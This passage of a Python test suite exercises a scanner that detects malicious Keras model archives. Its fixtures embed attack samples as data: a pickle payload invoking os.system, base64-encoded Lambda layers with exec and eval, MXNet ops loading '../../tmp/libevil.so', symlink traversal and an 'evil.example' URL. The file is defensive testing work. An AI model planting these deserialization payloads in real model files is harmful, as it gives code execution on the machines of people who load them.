        keras_path = tmp_path / "normalized_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {"class_name": "InputLayer", "name": "input_1", "config": {}},
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    },
                ]
            },
        }
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps(config))
            zf.writestr("./metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.writestr("./payload.pkl", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        assert result.metadata.get("keras_version") == "3.0.0"
        assert any("lambda" in issue.message.lower() for issue in result.issues)
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "./payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_scan_normalized_weights_member_checks_embedded_hdf5_external_references(self, tmp_path: Path) -> None:
        """Normalized ./model.weights.h5 members should still receive Keras-specific HDF5 checks."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "normalized_weights.keras"
        weights_path = create_external_link_weights_h5(tmp_path)
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("./metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.write(weights_path, "./model.weights.h5")

        result = scanner.scan(str(keras_path))

        assert result.metadata.get("keras_version") == "3.12.0"
        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].location is not None
        assert cve_issues[0].location.startswith(f"{keras_path}:")
        assert cve_issues[0].location.rsplit(":", 1)[-1].removeprefix("./") == "model.weights.h5"
        assert cve_issues[0].details["keras_version"] == "3.12.0"
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_scan_accepts_identical_config_json_aliases_without_warning_noise(self, tmp_path: Path) -> None:
        """Byte-identical canonical and normalized config aliases should stay non-noisy."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "identical_config_alias.keras"
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps(benign_config))
            zf.writestr("config.json", json.dumps(benign_config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = scanner.scan(str(keras_path))

        assert result.success is True
        assert not any(check.name == "Keras ZIP Member Path Validation" for check in result.checks)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_scan_fails_closed_on_conflicting_exact_and_alias_config_members(self, tmp_path: Path) -> None:
        """A benign canonical config.json must not suppress a malicious normalized alias."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "conflicting_exact_and_alias_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}
        malicious_config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    }
                ]
            },
        }

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(benign_config))
            zf.writestr("./config.json", json.dumps(malicious_config))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert sorted(ambiguity_checks[0].details["candidate_filenames"]) == ["./config.json", "config.json"]
        assert result.success is False

    def test_scan_fails_closed_on_conflicting_exact_duplicate_config_members(self, tmp_path: Path) -> None:
        """A benign trailing duplicate config.json must not hide a malicious earlier duplicate."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "conflicting_duplicate_config.keras"
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        malicious_config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                    }
                ]
            },
        }
        benign_config = {"class_name": "Sequential", "config": {"layers": []}}

        with warnings.catch_warnings():
            warnings.simplefilter("ignore", UserWarning)
            with zipfile.ZipFile(keras_path, "w") as zf:
                zf.writestr("config.json", json.dumps(malicious_config))
                zf.writestr("config.json", json.dumps(benign_config))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert ambiguity_checks[0].details["member_name"] == "config.json"
        assert ambiguity_checks[0].details["candidate_filenames"] == ["config.json", "config.json"]
        assert result.success is False

    def test_scan_fails_closed_on_ambiguous_normalized_config_aliases(self, tmp_path: Path) -> None:
        """Multiple non-canonical aliases for config.json should fail closed instead of depending on ZIP order."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "ambiguous_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("/config.json", json.dumps({"class_name": "Functional", "config": {"layers": []}}))

        result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert ambiguity_checks[0].details["member_name"] == "config.json"
        assert sorted(ambiguity_checks[0].details["candidate_filenames"]) == ["./config.json", "/config.json"]
        assert result.success is False

    def test_scan_fails_closed_when_duplicate_config_alias_count_exceeds_cap(self, tmp_path: Path) -> None:
        """Too many duplicate config candidates should fail before decompressing every alias."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "too_many_duplicate_aliases.keras"
        benign_config = json.dumps({"class_name": "Sequential", "config": {"layers": []}})

        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", benign_config)
            for index in range(scanner.MAX_DUPLICATE_MEMBER_COMPARE_CANDIDATES):
                zf.writestr(f"{'./' * (index + 1)}config.json", benign_config)

        with patch.object(
            keras_zip_scanner_module,
            "_read_zip_member_bounded",
            wraps=keras_zip_scanner_module._read_zip_member_bounded,
        ) as mock_read_member:
            result = scanner.scan(str(keras_path))

        ambiguity_checks = [check for check in result.checks if check.name == "Keras ZIP Member Path Validation"]
        assert len(ambiguity_checks) == 1
        assert ambiguity_checks[0].status == CheckStatus.FAILED
        assert len(ambiguity_checks[0].details["candidate_filenames"]) == (
            scanner.MAX_DUPLICATE_MEMBER_COMPARE_CANDIDATES + 1
        )
        assert mock_read_member.call_count == 0
        assert result.success is False

    def test_scan_bounds_recursive_member_rescans_with_embedded_weight_limit(self, tmp_path: Path) -> None:
        """Recursive fallback scans should not extract oversized non-Keras members with unbounded ZIP defaults."""
        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("payload.pkl", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        recursive_size_checks = [
            check
            for check in result.checks
            if check.name == "ZIP Entry Scan" and check.details.get("entry") == "payload.pkl"
        ]
        assert len(recursive_size_checks) == 1
        assert recursive_size_checks[0].status == CheckStatus.FAILED
        assert "exceeds maximum size of 1024 bytes" in recursive_size_checks[0].message
        assert recursive_size_checks[0].severity == IssueSeverity.INFO
        assert "zip_entry_scan_incomplete" in result.metadata["scan_outcome_reasons"]
        assert result.success is False
        assert result.has_warnings is False

        aggregate_result = scan_model_directory_or_file(str(keras_path), max_embedded_weights_bytes=1024)
        assert determine_exit_code(aggregate_result) == 2

    def test_scan_fails_closed_on_oversized_config_json_and_recurses_payloads(self, tmp_path: Path) -> None:
        """Oversized config.json members should be bounded before parsing and still recurse other entries."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "oversized_config.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            config = {
                "class_name": "Sequential",
                "config": {"layers": []},
                "padding": "A" * (11 * 1024 * 1024),
            }
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("payload.pkl", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        config_checks = [check for check in result.checks if check.name == "Config JSON Parsing"]
        assert len(config_checks) == 1
        assert config_checks[0].status == CheckStatus.FAILED
        assert "ZIP member exceeds bounded read size" in config_checks[0].message
        assert config_checks[0].details["max_config_bytes"] == 10 * 1024 * 1024
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert result.success is False

    def test_scan_marks_oversized_metadata_json_incomplete_without_false_security_finding(self, tmp_path: Path) -> None:
        """Oversized optional metadata cannot safely exclude hidden nested payloads."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "oversized_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                json.dumps({"keras_version": "3.0.0", "padding": "A" * (11 * 1024 * 1024)}),
            )

        result = scanner.scan(str(keras_path))

        assert result.success is False
        assert result.metadata.get("model_class") == "Sequential"
        assert "keras_version" not in result.metadata
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_scan_validates_symlink_metadata_before_skipping_recursive_content(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        keras_path = tmp_path / "symlink_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            metadata = zipfile.ZipInfo("metadata.json")
            metadata.create_system = 3
            metadata.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(metadata, "../external-metadata.json")

        result = scanner.scan(str(keras_path))

        assert any(
            check.name == "Symlink Safety Validation"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "metadata.json"
            for check in result.checks
        )

    def test_scan_recurses_pickle_payload_disguised_as_metadata(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        keras_path = tmp_path / "pickle_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", b"cos\nsystem\n(S'echo pwned'\ntR.")

        result = scanner.scan(str(keras_path))

        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "metadata.json"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_scan_recurses_mxnet_symbol_disguised_as_metadata(self, tmp_path: Path) -> None:
        scanner = KerasZipScanner()
        keras_path = tmp_path / "mxnet_metadata.keras"
        symbol_graph = {
            "nodes": [
                {"op": "null", "name": "data", "inputs": []},
                {
                    "op": "Custom",
                    "name": "custom_loader",
                    "attrs": {"library": "../../tmp/libevil.so", "op_type": "unsafe_loader"},
                    "inputs": [[0, 0, 0]],
                },
            ],
            "arg_nodes": [0],
            "heads": [[1, 0, 0]],
        }
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps(symbol_graph))

        result = scanner.scan(str(keras_path))

        assert any(issue.details.get("attribute") == "library" for issue in result.issues)

    def test_scan_fails_closed_for_ambiguous_mxnet_symbol_disguised_as_metadata(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "ambiguous_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"nodes":[{"op":"Custom","name":"load","attrs":"'
                + ("x" * 129)
                + '"},{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[1,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_fails_closed_for_mxnet_node_object_before_metadata_padding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "padded_node_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"nodes":[{"attrs":"'
                + ("x" * 129)
                + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[0,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    @pytest.mark.parametrize("initial_nodes", ["[]", "null"])
    def test_scan_fails_closed_for_duplicate_mxnet_nodes_after_truncated_metadata_prefix(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        initial_nodes: str,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "duplicate_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"nodes":'
                + initial_nodes
                + ',"padding":"'
                + ("x" * 129)
                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[0,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_fails_closed_for_mxnet_nodes_after_visible_head_metadata_padding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "padded_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"heads":[[0,0,0]],"padding":"'
                + ("x" * 129)
                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_fails_closed_for_mxnet_nodes_hidden_after_metadata_padding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        keras_path = tmp_path / "hidden_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr(
                "metadata.json",
                '{"padding":"'
                + ("x" * 129)
                + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
                '"arg_nodes":[0],"heads":[[0,0,0]]}',
            )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_scan_does_not_suppress_mxnet_ambiguity_in_nested_archive(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
        nested_path = tmp_path / "payload.zip"
        with zipfile.ZipFile(nested_path, "w") as nested_zip:
            nested_zip.writestr(
                "metadata.json",
                '{"heads":[[0,0,0]],"nodes":[{"attrs":"' + ("x" * 129) + '"}],"arg_nodes":[0]}',
            )

        keras_path = tmp_path / "nested_mxnet_metadata.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.write(nested_path, "payload.zip")

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert any(
            check.name == "MXNet Symbol Routing" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_oversized_root_weights_skip_does_not_hide_nested_pickle_weights(self, tmp_path: Path) -> None:
        nested_path = tmp_path / "payload.zip"
        with zipfile.ZipFile(nested_path, "w") as nested_zip:
            nested_zip.writestr("model.weights.h5", b'cos\nsystem\n(S"echo pwned"\ntR.')

        keras_path = tmp_path / "nested_weights.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)
            zf.write(nested_path, "payload.zip")

        result = KerasZipScanner({"max_embedded_weights_bytes": 1024}).scan(str(keras_path))

        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "payload.zip:model.weights.h5"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    def test_lambda_layer_with_exec(self, tmp_path: Path) -> None:
        """Test detection of Lambda layer with exec() call."""
        scanner = KerasZipScanner()

        # Create malicious Lambda layer config
        malicious_code = "exec(\"print('Malicious!')\")"
        encoded_code = base64.b64encode(malicious_code.encode()).decode()

        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "function": [encoded_code, None, None],
                            "function_type": "lambda",
                        },
                    },
                ]
            },
        }

        temp_path = Path(_build_test_keras_zip(config, tmp_path, "3.0.0"))
        result = scanner.scan(str(temp_path))

        # Should detect Lambda layer with exec
        assert len(result.issues) > 0, "Should detect Lambda layer with dangerous code"

        # Check for critical issue
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) > 0, "Lambda with exec should be CRITICAL"

        # Check that exec was detected
        exec_found = False
        for issue in result.issues:
            if "exec" in issue.message.lower() and "lambda" in issue.message.lower():
                exec_found = True
                assert "lambda_1" in issue.message or "lambda_1" in str(issue.details)
                break

        assert exec_found, "Should detect exec in Lambda layer"

    def test_multiple_dangerous_patterns(self, tmp_path: Path) -> None:
        """Test detection of multiple dangerous patterns in Lambda layers."""
        scanner = KerasZipScanner()

        # Create Lambda with multiple dangerous patterns
        dangerous_code = """
import os
import subprocess
eval("os.system('cmd')")
subprocess.call(['ls'])
__import__('pickle').loads(data)
"""
        encoded_code = base64.b64encode(dangerous_code.encode()).decode()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "dangerous_lambda",
                        "config": {
                            "function": [encoded_code, None, None],
                        },
                    }
                ]
            },
        }

        temp_path = tmp_path / "multiple_patterns.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Should detect dangerous patterns
        assert len(result.issues) > 0, "Should detect dangerous patterns"

        # Check that multiple patterns were detected
        all_messages = " ".join(issue.message for issue in result.issues)
        patterns_detected = []
        for pattern in ["eval", "subprocess", "__import__", "pickle"]:
            if pattern in all_messages.lower():
                patterns_detected.append(pattern)

        assert len(patterns_detected) > 0, f"Should detect dangerous patterns, found: {patterns_detected}"

    def test_safe_lambda_layer(self, tmp_path: Path) -> None:
        """Test that safe Lambda layers are handled appropriately."""
        scanner = KerasZipScanner()

        # Create a Lambda with safe code
        safe_code = "lambda x: x * 2"
        encoded_code = base64.b64encode(safe_code.encode()).decode()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "safe_lambda",
                        "config": {
                            "function": [encoded_code, None, None],
                        },
                    }
                ]
            },
        }

        temp_path = tmp_path / "safe_lambda.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Safe Lambda should not be CRITICAL
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) == 0, "Safe Lambda should not be CRITICAL"

    def test_opaque_lambda_bytecode_stays_warning(self, tmp_path: Path) -> None:
        """Opaque compiled Lambda bytecode should remain a warning-level finding."""
        scanner = KerasZipScanner()
        encoded_code = base64.b64encode(marshal.dumps((lambda x: x + 1).__code__)).decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "opaque_lambda",
                        "config": {"function": [encoded_code, None, None]},
                    }
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config)))

        opaque_issues = [
            issue
            for issue in result.issues
            if issue.details.get("layer_name") == "opaque_lambda"
            and issue.details.get("analysis_status") == "opaque_bytecode"
        ]
        assert len(opaque_issues) == 1
        assert opaque_issues[0].severity == IssueSeverity.WARNING
        assert not [
            issue
            for issue in result.issues
            if "opaque_lambda" in issue.message and issue.severity == IssueSeverity.CRITICAL
        ]

    @pytest.mark.parametrize("function_format", ["list", "dict"])
    @pytest.mark.parametrize("module_name", ["os", "socket", "OS.Path"])
    def test_encoded_lambda_still_checks_dangerous_sibling_module(
        self,
        tmp_path: Path,
        function_format: str,
        module_name: str,
    ) -> None:
        """Encoded Lambda payloads must not suppress dangerous sibling metadata."""
        encoded_code = base64.b64encode(marshal.dumps((lambda x: x + 1).__code__)).decode()
        function_data: Any = [encoded_code, None, None]
        if function_format == "dict":
            function_data = {"class_name": "__lambda__", "config": {"code": encoded_code}}
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "mixed_module_lambda",
                        "config": {
                            "function": function_data,
                            "module": module_name,
                            "function_name": "system",
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert any(
            check.name == "Lambda Layer Module Reference Check"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("module") == module_name
            and check.details.get("function") == "system"
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "module_name",
        ["custom_package.systematic_math", "company.os.metrics", "company.operator.layers"],
    )
    def test_lambda_module_reference_uses_import_root_for_benign_module(
        self,
        tmp_path: Path,
        module_name: str,
    ) -> None:
        """Benign module identifiers containing suspicious substrings should remain quiet."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "benign_module_lambda",
                        "config": {
                            "module": module_name,
                            "function_name": "normalize",
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert not any(check.name == "Lambda Layer Module Reference Check" for check in result.checks)

    @pytest.mark.parametrize(
        ("module_name", "function_name"),
        [("os", "system"), ("operator", "attrgetter")],
    )
    def test_nested_named_lambda_function_reference_is_detected(
        self,
        tmp_path: Path,
        module_name: str,
        function_name: str,
    ) -> None:
        """Keras 3 named-function Lambda metadata must not bypass module checks."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "nested_named_function",
                        "config": {
                            "function": {
                                "module": module_name,
                                "class_name": "function",
                                "config": function_name,
                                "registered_name": function_name,
                            }
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert any(
            check.name == "Lambda Layer Module Reference Check"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("module") == module_name
            and check.details.get("function") == function_name
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("module_name", "function_name"),
        [("operator", "add"), ("keras.ops", "absolute")],
    )
    def test_benign_nested_named_lambda_function_is_not_critical(
        self,
        tmp_path: Path,
        module_name: str,
        function_name: str,
    ) -> None:
        """Benign named functions must not inherit module-wide critical severity."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "benign_named_function",
                        "config": {
                            "function": {
                                "module": module_name,
                                "class_name": "function",
                                "config": function_name,
                                "registered_name": function_name,
                            }
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert not any(
            check.name == "Lambda Layer Module Reference Check" and check.severity == IssueSeverity.CRITICAL
            for check in result.checks
        )

    def test_lambda_function_name_does_not_escalate_with_benign_module(self, tmp_path: Path) -> None:
        """A custom function sharing a gadget name must not be treated as a stdlib gadget."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "dangerous_function_lambda",
                        "config": {
                            "module": "custom_package.math",
                            "function_name": "system",
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert not any(
            check.name == "Lambda Layer Module Reference Check" and check.severity == IssueSeverity.CRITICAL
            for check in result.checks
        )

    def test_lambda_function_name_without_module_is_warning(self, tmp_path: Path) -> None:
        """Sensitive function names without provenance should remain visible without critical attribution."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "unattributed_function_lambda",
                        "config": {"function_name": "system"},
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        matching_checks = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Module Reference Check"
            and check.details.get("parse_status") == "module_unavailable"
        ]
        assert len(matching_checks) == 1
        assert matching_checks[0].severity == IssueSeverity.WARNING

    def test_malformed_nested_named_lambda_function_is_warning(self, tmp_path: Path) -> None:
        """Malformed nested callable metadata must fail closed without retaining its payload."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "malformed_nested_function",
                        "config": {
                            "function": {
                                "module": None,
                                "class_name": "function",
                                "config": ["system"],
                                "registered_name": None,
                            }
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        matching_checks = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Module Reference Check"
            and check.details.get("function_format") == "nested_named_function"
        ]
        assert len(matching_checks) == 1
        assert matching_checks[0].severity == IssueSeverity.WARNING
        assert matching_checks[0].details["module_type"] == "NoneType"
        assert matching_checks[0].details["function_type"] == "list"
        assert "system" not in json.dumps(matching_checks[0].details)

    @pytest.mark.parametrize("function_format", ["list", "dict"])
    @pytest.mark.parametrize("benign_identifier", ["opened", "executor", "osésystem"])
    def test_lambda_bytecode_pattern_matching_uses_token_boundaries(
        self,
        tmp_path: Path,
        function_format: str,
        benign_identifier: str,
    ) -> None:
        """Benign identifiers containing dangerous substrings must not escalate Lambda findings."""
        encoded_code = base64.b64encode(benign_identifier.encode()).decode()
        function_data: Any = [encoded_code, None, None]
        if function_format == "dict":
            function_data = {"class_name": "__lambda__", "config": {"code": encoded_code}}
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "substring_lambda",
                        "config": {"function": function_data},
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert not any(
            issue.severity == IssueSeverity.CRITICAL and "substring_lambda" in issue.message for issue in result.issues
        )

    @pytest.mark.parametrize("function_format", ["list", "dict"])
    @pytest.mark.parametrize("network_reference", ["https://evil.example/payload", "urllib3.PoolManager"])
    def test_lambda_bytecode_token_boundaries_preserve_network_signals(
        self,
        tmp_path: Path,
        network_reference: str,
        function_format: str,
    ) -> None:
        """Boundary-aware Lambda matching must retain explicit network indicators."""
        encoded_code = base64.b64encode(network_reference.encode()).decode()
        function_data: Any = [encoded_code, None, None]
        if function_format == "dict":
            function_data = {
                "class_name": "__lambda__",
                "config": {"code": encoded_code},
            }
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "network_lambda",
                        "config": {"function": function_data},
                    }
                ]
            },
        }

